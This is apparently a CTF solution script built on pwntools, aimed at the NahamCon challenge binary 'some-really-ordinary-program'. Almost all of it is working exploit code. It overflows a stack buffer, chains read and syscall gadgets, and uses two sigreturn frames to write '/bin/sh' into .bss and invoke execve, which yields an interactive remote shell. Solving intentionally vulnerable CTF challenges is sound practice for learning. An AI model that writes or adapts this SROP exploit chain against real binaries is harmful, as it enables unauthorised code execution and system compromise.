#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challenge.nahamcon.com --port 32072 ./some-really-ordinary-program
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./some-really-ordinary-program')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challenge.nahamcon.com'
port = int(args.PORT or 32545)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x401022
tbreak *0x{exe.entry:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments

io = start()

write = 0x401011 # eax 1
read = 0x401006 # eax 0
syscall = 0x40101f
main = 0x401022
bss = 0x00000000402000

p = 'a'*500
p += p64(0)
p += p64(read)
p += p64(syscall)

frame = SigreturnFrame()
frame.rsp = bss + 0x500
frame.rip = main 
p += str(frame)

p = p.ljust(0x320,"\x00")
io.sendafter("\x00",p)

sleep(0.5)
io.sendline("/bin/sh".ljust(14,"\x00"))

# 2
p = 'a'*500
p += p64(0)
p += p64(read)
p += p64(syscall)
frame = SigreturnFrame()
frame.rax = 59 # 59 excerve
frame.rdi = bss + 0x304 # bss -> "/bin/sh\x00"
frame.rsi = 0 # harus 0
frame.rdx = 0 # harus 0
frame.rsp = bss + 0x500
frame.rip = syscall # jump -> syscall
p += str(frame)

p = p.ljust(0x320,"\x00")
io.sendafter("you get.\n\x00",p)

sleep(0.5)
io.sendline("/bin/sh".ljust(14,"\x00"))

io.interactive()
